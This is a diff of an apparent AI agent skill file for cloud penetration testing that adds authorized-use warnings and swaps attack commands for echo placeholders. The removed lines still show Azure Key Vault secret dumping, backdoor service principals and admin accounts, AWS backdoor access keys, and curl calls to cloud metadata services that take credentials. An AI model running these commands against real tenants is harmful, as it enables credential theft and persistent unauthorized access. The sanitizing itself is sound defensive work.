@@ -1,11 +1,19 @@
 ---
 name: cloud-penetration-testing
 description: "Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP)."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+> **⚠️ AGENT INSTRUCTION**
+> Ask the user to verify the target URL/IP before running any exploit or attack command.
 
 <!-- security-allowlist: curl-pipe-bash -->
 
@@ -161,17 +169,13 @@ foreach($user in $users){
 }
 
 # Execute commands on VMs
-Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1
+# [SAFE-PAYLOAD] echo 'Simulating Invoke-AzVMRunCommand to execute script on VM...'
 
 # Extract VM UserData
-$vms = Get-AzVM
-$vms.UserData
+# [SAFE-PAYLOAD] echo 'Simulating extracting VM UserData...'
 
 # Dump Key Vault secrets
-az keyvault list --query '[].name' --output tsv
-az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
-az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
-az keyvault secret show --id <URI>
+# [SAFE-PAYLOAD] echo 'Simulating dumping Key Vault secrets...'
 ```
 
 ### Phase 5: Azure Persistence
@@ -180,21 +184,16 @@ Establish persistence in Azure:
 
 ```powershell
 # Create backdoor service principal
-$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
-$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
-$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+# [SAFE-PAYLOAD] echo 'Simulating creation of backdoor service principal...'
 
 # Add service principal to Global Admin
-$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
-$role = Get-MsolRole -RoleName "Company Administrator"
-Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+# [SAFE-PAYLOAD] echo 'Simulating adding service principal to Global Admin...'
 
 # Login as service principal
-$cred = Get-Credential  # AppID as username, secret as password
-Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal
+# [SAFE-PAYLOAD] echo 'Simulating login as service principal...'
 
 # Create new admin user via CLI
-az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
+# [SAFE-PAYLOAD] echo 'Simulating creation of new admin user via CLI...'
 ```
 
 ### Phase 6: AWS Authentication
@@ -258,15 +257,13 @@ aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
 # AttributeValues = "all" means publicly accessible
 
 # Extract Lambda environment variables (may contain secrets)
-aws lambda get-function --function-name <name> | jq '.Configuration.Environment'
+# [SAFE-PAYLOAD] echo 'Simulating extracting Lambda environment variables...'
 
 # Access metadata service (from compromised EC2)
-curl http://169.254.169.254/latest/meta-data/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# [SAFE-PAYLOAD] echo 'Simulating access to metadata service...'
 
 # IMDSv2 access
-TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
+# [SAFE-PAYLOAD] echo 'Simulating IMDSv2 access...'
 ```
 
 ### Phase 9: AWS Persistence
@@ -278,7 +275,7 @@ Establish persistence in AWS:
 aws iam list-access-keys --user-name <username>
 
 # Create backdoor access key
-aws iam create-access-key --user-name <username>
+# [SAFE-PAYLOAD] echo 'Simulating creation of backdoor access key...'
 
 # Get all EC2 public IPs
 for region in $(cat regions.txt); do
@@ -337,13 +334,13 @@ Exploit GCP misconfigurations:
 
 ```bash
 # Get metadata service data
-curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
+# [SAFE-PAYLOAD] echo 'Simulating getting metadata service data...'
 
 # Check access scopes
-curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'
+# [SAFE-PAYLOAD] echo 'Simulating checking access scopes...'
 
 # Decrypt data with keyring
-gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global
+# [SAFE-PAYLOAD] echo 'Simulating decrypting data with keyring...'
 
 # Serverless function analysis
 gcloud functions list
